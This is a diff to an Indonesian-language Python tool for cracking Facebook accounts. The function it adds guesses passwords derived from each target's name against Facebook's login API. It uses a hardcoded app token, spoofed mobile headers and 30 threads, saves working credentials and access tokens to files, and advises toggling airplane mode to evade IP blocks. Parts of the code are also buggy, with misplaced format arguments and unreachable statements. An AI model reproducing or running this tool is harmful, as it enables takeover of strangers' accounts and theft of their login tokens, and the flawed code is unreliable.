@@ -7,6 +7,12 @@ except ImportError:
 	print("\n ! module requests belum terinstall")
 	os.system("pip install requests" if os.name == "nt" else "pip2 install requests")
 
+try:
+	import bs4
+except ImportError:
+	print("\n ! module bs4 belum terinstall")
+	os.system("pip install bs4" if os.name == "nt" else "pip2 install bs4")
+
 import os, sys, re, time, requests, json, random, bs4, calendar
 from multiprocessing.pool import ThreadPool
 from datetime import datetime
@@ -235,6 +241,7 @@ def method():
 			manual()
 		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
 		print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
+		print(" ! jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
 		ThreadPool(30).map(bapi, id)
 		exit("\n\n # selesai...")
 	elif method == "2":
@@ -243,6 +250,7 @@ def method():
 			manual()
 		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
 		print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
+		print(" ! jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
 		ThreadPool(30).map(mbasic, id)
 		exit("\n\n # selesai...")
 	elif method == "3":
@@ -251,6 +259,7 @@ def method():
 			manual()
 		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
 		print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
+		print(" ! jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
 		ThreadPool(30).map(mobile, id)
 		exit("\n\n # selesai...")
 	else:
@@ -271,6 +280,49 @@ def cek_ttl_cp(uid, pw):
 		month = (" ")
 		year = (" ")
 	except:pass
+
+def bapi(user):
+	try:
+		ua = open(".ua", "r").read()
+	except IOError:
+		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+	global loop, token
+	sys.stdout.write(
+		"\r * crack %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
+	); sys.stdout.flush()
+	uid, name = user.split("<=>")
+	if len(name)>=6:
+		pwx = [ name, name+"123", name+"1234", name+"12345" ]
+	elif len(name)<=2:
+		pwx = [ name+"123", name+"1234", name+"12345" ]
+	elif len(name)<=3:
+		pwx = [ name+"123", name+"12345" ]
+	else:
+		pwx = [ name+"123", name+"12345" ]
+	try:
+		for pw in pwx:
+			pw = pw.lower()
+			ses = requests.Session()
+			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
+			param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
+			api = "https://b-api.facebook.com/method/auth.login"
+			send = ses.get(api, params=param, headers=headers_) 
+			if "session_key" in send.text and "EAAA" in send.text:
+				print("\r \033[0;92m+ %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+				ok.append("%s|%s"%(uid, pw))
+				open("OK/%s.txt", "a"%(tanggal)).write(" + %s|%s\n"%(uid, pw))
+				break
+				continue
+			elif "www.facebook.com" in send.json()["error_msg"]:
+				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
+				cp.append("%s|%s"%(uid, pw))
+				open("CP/%s.txt", "a"%(tanggal)).write(" + %s|%s\n"%(uid, pw))
+				break
+				continue
+
+		loop += 1
+	except:
+		pass
 
 def mbasic(user):
 	try:
@@ -314,8 +366,8 @@ def mbasic(user):
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				cek_ttl_cp(uid, pw)
-				break
+				#cek_ttl_cp(uid, pw)
+				#break
 				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt", "a"%(tanggal)).write(" + %s|%s\n"%(uid, pw))
@@ -369,55 +421,6 @@ def mobile(user):
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				cek_ttl_cp(uid, pw)
-				break
-				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
-				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt", "a"%(tanggal)).write(" + %s|%s\n"%(uid, pw))
-				break
-				continue
-
-		loop += 1
-	except:
-		pass
-
-def bapi(user):
-	try:
-		ua = open(".ua", "r").read()
-	except IOError:
-		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
-	global loop, token
-	sys.stdout.write(
-		"\r * crack %s/%s -> ok:-%s - cp:-%s "%(loop, len(id), len(ok), len(cp))
-	); sys.stdout.flush()
-	uid, name = user.split("<=>")
-	if len(name)>=6:
-		pwx = [ name, name+"123", name+"1234", name+"12345" ]
-	elif len(name)<=2:
-		pwx = [ name+"123", name+"1234", name+"12345" ]
-	elif len(name)<=3:
-		pwx = [ name+"123", name+"12345" ]
-	else:
-		pwx = [ name+"123", name+"12345" ]
-	try:
-		for pw in pwx:
-			pw = pw.lower()
-			ses = requests.Session()
-			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
-			param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
-			api = "https://b-api.facebook.com/method/auth.login"
-			send = ses.get(api, params=param, headers=headers_) 
-			if send.status_code !=200:
-				print("\r ! IP Terkena Block Hidupkan Mode Pesawat 5 Detik", sys.stdout.flush())
-				loop +=1
-				bapi(uid, pw)
-			if "session_key" in send.text and "EAAA" in send.text:
-				print("\r \033[0;92m+ %s|%s\033[0;97m        "%(uid, pw))
-				ok.append("%s|%s"%(uid, pw))
-				open("OK/%s.txt", "a"%(tanggal)).write(" + %s|%s\n"%(uid, pw))
-				break
-				continue
-			elif "www.facebook.com" in send.json()["error_msg"]:
 				cek_ttl_cp(uid, pw)
 				break
 				print("\r \033[0;93m+ %s|%s\033[0;97m        "%(uid, pw))
